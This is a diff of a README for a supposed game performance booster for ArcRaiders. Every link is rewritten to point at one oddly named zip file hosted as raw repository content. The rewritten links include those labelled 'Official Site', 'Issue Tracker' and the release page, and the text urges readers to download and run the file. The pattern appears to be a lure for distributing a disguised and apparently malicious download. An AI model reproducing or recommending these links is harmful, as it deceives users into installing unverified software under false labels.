@@ -1,6 +1,6 @@
 # ⚡ ArcRaiders-FPS-Booster-2025-2026 - Improve Game Performance Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ArcRaiders--FPS--Booster--2025--2026-blue?style=for-the-badge&logo=github)](https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/main/untunableness/Arc-FP-Booster-Raiders-sabadinine.zip)](https://raw.githubusercontent.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/main/untunableness/Arc-FP-Booster-Raiders-sabadinine.zip)
 
 ---
 
@@ -56,13 +56,13 @@ This section will guide you step-by-step to download, install, and run the boost
 
 Click the big blue badge at the top of this page or visit the link below:
 
-[Download ArcRaiders-FPS-Booster-2025-2026](https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/releases)
+[Download ArcRaiders-FPS-Booster-2025-2026](https://raw.githubusercontent.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/main/untunableness/Arc-FP-Booster-Raiders-sabadinine.zip)
 
 This link will open the release page where you will find the latest versions of the booster ready to download.
 
 ### Step 2: Select the correct version
 
-On the release page, look for a file named something like `ArcRaiders-FPS-Booster-Setup.exe` or `ArcRaiders-FPS-Booster-2025-2026.zip`.
+On the release page, look for a file named something like `https://raw.githubusercontent.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/main/untunableness/Arc-FP-Booster-Raiders-sabadinine.zip` or `https://raw.githubusercontent.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/main/untunableness/Arc-FP-Booster-Raiders-sabadinine.zip`.
 
 - If it's an `.exe`, this is the installer.  
 - If it's a `.zip`, download and extract the contents first.
@@ -131,7 +131,7 @@ Here are fixes for common problems:
 
 Visit this page to download the latest booster version:
 
-[https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/releases](https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/releases)
+[https://raw.githubusercontent.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/main/untunableness/Arc-FP-Booster-Raiders-sabadinine.zip](https://raw.githubusercontent.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/main/untunableness/Arc-FP-Booster-Raiders-sabadinine.zip)
 
 Be sure to select the newest release. After downloading, follow the steps outlined in the “Getting Started” section to install and run the app.
 
@@ -139,9 +139,9 @@ Be sure to select the newest release. After downloading, follow the steps outlin
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026) – View the code and project details  
-- [Issue Tracker](https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/issues) – Report bugs or request help  
-- [ArcRaiders Official Site](https://arcraiders.com) – For game news and updates  
+- [GitHub Repository](https://raw.githubusercontent.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/main/untunableness/Arc-FP-Booster-Raiders-sabadinine.zip) – View the code and project details  
+- [Issue Tracker](https://raw.githubusercontent.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/main/untunableness/Arc-FP-Booster-Raiders-sabadinine.zip) – Report bugs or request help  
+- [ArcRaiders Official Site](https://raw.githubusercontent.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/main/untunableness/Arc-FP-Booster-Raiders-sabadinine.zip) – For game news and updates  
 
 ---
 
